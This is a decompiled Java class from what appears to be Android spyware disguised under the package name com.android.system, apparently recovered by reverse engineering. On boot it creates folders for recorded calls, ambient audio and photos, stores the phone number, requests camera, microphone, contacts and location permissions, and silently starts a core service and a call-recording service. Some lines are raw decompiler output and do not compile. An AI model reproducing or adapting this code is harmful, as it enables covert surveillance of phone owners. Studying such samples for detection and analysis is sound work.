package com.android.system;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.app.system.common.c;
import com.app.system.common.entity.DeviceInfo;
import com.app.system.common.h;
import com.app.system.common.h.b;
import com.app.system.common.h.m;
import com.security.d.a;
import java.io.File;

public class BootBroadcast
  extends BroadcastReceiver
{
  private static boolean a = false;
  
  public static void a(Context paramContext)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        BootBroadcast.d(this.a);
      }
    }, "CheckPermissionsThread").start();
  }
  
  public static void b(Context paramContext)
  {
    a.d("BootBroadcast", "Permessi accordati: invio broadcast a StartActivity", new Object[0]);
    paramContext.sendBroadcast(new Intent("com.system.services.action.GRANT_OK"));
    new Thread(new Runnable()
    {
      public void run()
      {
        BootBroadcast.c(this.a);
      }
    }, "BootCompletedThread").start();
  }
  
  public static void c(Context paramContext)
  {
    try
    {
      if (a)
      {
        a.d("BootBroadcast", "onBootCompleted() già eseguita", new Object[0]);
        return;
      }
      try
      {
        a.d("BootBroadcast", "onBootCompleted()", new Object[0]);
        Object localObject1 = new com/app/system/common/h/b;
        ((b)localObject1).<init>(c.h);
        ((b)localObject1).a(paramContext);
        localObject1 = new java/io/File;
        Object localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        ((StringBuilder)localObject2).append(c.f);
        ((StringBuilder)localObject2).append("RecordCall/");
        ((File)localObject1).<init>(((StringBuilder)localObject2).toString());
        if (!((File)localObject1).exists()) {
          ((File)localObject1).mkdir();
        }
        localObject2 = new java/io/File;
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        ((StringBuilder)localObject1).append(c.f);
        ((StringBuilder)localObject1).append("RecAmbient/");
        ((File)localObject2).<init>(((StringBuilder)localObject1).toString());
        if (!((File)localObject2).exists()) {
          ((File)localObject2).mkdir();
        }
        localObject1 = new java/io/File;
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        ((StringBuilder)localObject2).append(c.f);
        ((StringBuilder)localObject2).append("Photo/");
        ((File)localObject1).<init>(((StringBuilder)localObject2).toString());
        if (!((File)localObject1).exists()) {
          ((File)localObject1).mkdir();
        }
        localObject2 = paramContext.getSharedPreferences("pref", 0);
        localObject1 = ((SharedPreferences)localObject2).edit();
        if (!h.b(h.c(paramContext))) {
          ((SharedPreferences.Editor)localObject1).putString("device-telephone-number", h.d(paramContext));
        }
        if (((SharedPreferences)localObject2).getBoolean("agent-active", false))
        {
          LocationReceiver.b(paramContext);
          SyncAndFlushReceiver.b(paramContext);
          if (((SharedPreferences)localObject2).getInt("is_first_reboot", 0) == 0) {
            ((SharedPreferences.Editor)localObject1).putInt("is_first_reboot", 1);
          }
          SyncDeviceInfoReceiver.a(paramContext, true);
          if (!h.e(paramContext))
          {
            a.d("BootBroadcast", "onBootCompleted(): STARTING CORE SERVICE", new Object[0]);
            localObject2 = new android/content/Intent;
            ((Intent)localObject2).<init>(paramContext, CoreService.class);
            ((Intent)localObject2).setFlags(268435456);
            paramContext.startService((Intent)localObject2);
          }
        }
        else
        {
          a.d("BootBroadcast", "onBootCompleted(): AGENT NON ATTIVO -- NOT STARTING CORE SERVICE", new Object[0]);
          ActivationReceiver.a(paramContext);
        }
        ((SharedPreferences.Editor)localObject1).commit();
        DeviceInfo.d(paramContext);
        SimStateReceiver.a(paramContext);
      }
      catch (Exception paramContext)
      {
        a.a("BootBroadcast", paramContext.getMessage(), new Object[0]);
      }
      a = true;
      return;
    }
    finally {}
  }
  
  private static void e(Context paramContext)
  {
    a.d("BootBroadcast", "Verifico permessi...", new Object[0]);
    Intent localIntent = new Intent(paramContext, PermissionActivity.class);
    localIntent.putExtra("com.system.services.PERMISSIONS", new String[] { "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_CONTACTS", "android.permission.CAMERA", "android.permission.RECORD_AUDIO", "android.permission.ACCESS_FINE_LOCATION", "android.permission.READ_PHONE_STATE" });
    localIntent.setFlags(268435456);
    paramContext.startActivity(localIntent);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    a.d("BootBroadcast", "BOOT_COMPLETED BROADCAST RECEIVED", new Object[0]);
    c(paramContext);
    new m(paramContext).f();
    RecordCallService.a(paramContext, 600, null);
  }
}


/* Location:              ~/com/android/system/BootBroadcast.class
 *
 * Reversed by:           J
 */